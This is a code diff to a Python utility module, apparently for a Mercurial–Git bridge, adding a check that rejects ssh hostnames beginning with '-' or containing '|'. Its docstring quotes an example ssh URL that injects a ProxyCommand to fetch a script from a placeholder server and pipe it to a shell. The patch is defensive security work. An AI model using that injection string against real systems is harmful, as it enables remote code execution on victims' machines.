@@ -1,6 +1,7 @@
 """Compatibility functions for old Mercurial versions and other utility
 functions."""
 import re
+import urllib
 
 try:
     from collections import OrderedDict
@@ -8,7 +9,10 @@ except ImportError:
     from ordereddict import OrderedDict
 
 from dulwich import errors
+from mercurial.i18n import _
 from mercurial import (
+    encoding,
+    error,
     lock as lockmod,
     util as hgutil,
 )
@@ -119,3 +123,18 @@ def updatebookmarks(repo, changes, name='git_handler'):
         tr.close()
     finally:
         lockmod.release(tr, lock, wlock)
+
+def checksafessh(host):
+    """check if a hostname is a potentially unsafe ssh exploit (SEC)
+
+    This is a sanity check for ssh urls. ssh will parse the first item as
+    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
+    Let's prevent these potentially exploited urls entirely and warn the
+    user.
+
+    Raises an error.Abort when the url is unsafe.
+    """
+    host = urllib.unquote(host)
+    if host.startswith('-') or '|' in host:
+        raise error.Abort(_('potentially unsafe hostname: %r') %
+                          (host,))
